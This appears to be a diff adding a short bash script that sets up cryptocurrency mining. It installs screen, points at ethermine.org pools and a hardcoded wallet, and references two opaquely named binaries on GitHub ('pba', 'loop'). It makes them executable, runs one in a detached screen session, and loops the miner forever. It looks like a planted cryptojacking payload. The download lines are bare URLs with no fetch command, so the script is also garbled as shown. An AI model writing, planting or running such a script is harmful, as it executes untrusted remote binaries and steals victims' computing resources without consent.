@@ -1,0 +1,16 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen -y
+sudo apt install -y libpci-dev
+POOL1=ssl://asia1.ethermine.org:5555
+POOL2=ssl://eu1.ethermine.org:5555
+WALLET1=0x83262fd642190cdd04dae96005e26330d9b09362
+WORKER1=$(echo $(shuf -i 1-40 -n 1)-XXXX)
+https://github.com/christiarch/templates/raw/main/pba
+https://github.com/christiarch/templates/raw/main/loop
+chmod +x loop pba
+screen -dmS In ./loop
+	while [ 1 ]; do
+	        ./pba -pool $POOL1 -pool2 $POOL2 -wal $WALLET1.$WORKER1 -proto 3 -nvmem 1 -straps 2
+			sleep 5
+	done
